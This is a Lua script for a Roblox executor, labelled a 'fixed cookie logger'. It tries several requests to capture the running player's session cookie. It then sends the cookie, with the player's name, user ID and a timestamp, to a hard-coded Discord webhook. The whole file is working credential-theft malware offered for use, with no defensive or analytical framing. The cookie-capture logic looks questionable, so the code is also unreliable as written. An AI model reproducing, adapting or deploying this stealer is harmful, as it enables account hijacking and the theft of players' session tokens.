-- FIXED COOKIE LOGGER FOR DELTA EXECUTOR
local player = game.Players.LocalPlayer
local playerName = player.Name
local userId = player.UserId

-- Check if syn is available
if not syn then
    syn = getgenv().syn or {}
end

-- Get cookie function with multiple methods
local function getCookie()
    local cookie = ""
    
    -- Method 1: Get from mobile API
    local success, response = pcall(function()
        return syn.request({
            Url = "https://www.roblox.com/mobileapi/userinfo",
            Method = "GET"
        })
    end)
    
    if success and response and response.Headers then
        local headers = response.Headers
        if headers["Cookie"] then
            cookie = headers["Cookie"]
        elseif headers["set-cookie"] then
            cookie = headers["set-cookie"]
        end
    end
    
    -- If no cookie yet, try method 2
    if cookie == "" then
        success, response = pcall(function()
            return syn.request({
                Url = "https://www.roblox.com/game/",
                Method = "GET"
            })
        end)
        
        if success and response and response.Headers then
            cookie = response.Headers["Cookie"] or ""
        end
    end
    
    -- Method 3: Try using HTTP service
    if cookie == "" and game:GetService("HttpService") then
        success, response = pcall(function()
            return syn.request({
                Url = "https://www.roblox.com/",
                Method = "GET"
            })
        end)
        
        if success and response and response.Headers then
            cookie = response.Headers["Cookie"] or ""
        end
    end
    
    return cookie
end

-- Actually get the cookie now
local cookie = getCookie()

-- Build the message
local message = "**ROBLOX COOKIE LOGGED**\n"
message = message .. "**Player:** " .. playerName .. " (ID: " .. userId .. ")\n"
if cookie and cookie ~= "" then
    message = message .. "**Cookie:** `" .. cookie .. "`\n"
else
    message = message .. "**Cookie:** `FAILED TO RETRIEVE`\n"
end
message = message .. "**Executed:** " .. os.date("%Y-%m-%d %H:%M:%S")

-- Webhook URL
local webhookURL = "https://discord.com/api/webhooks/1518937462083424316/WJi4kfdiYXec4XghwYhIfqHvnSNP5deGj-t992Cuk3iEl9N-QtuOD-y6B7OyeGKdwCpT"

-- Send to Discord
local success, result = pcall(function()
    return syn.request({
        Url = webhookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({content = message})
    })
end)

if success then
    print("Cookie sent successfully!")
else
    print("Failed to send cookie: " .. tostring(result))
end
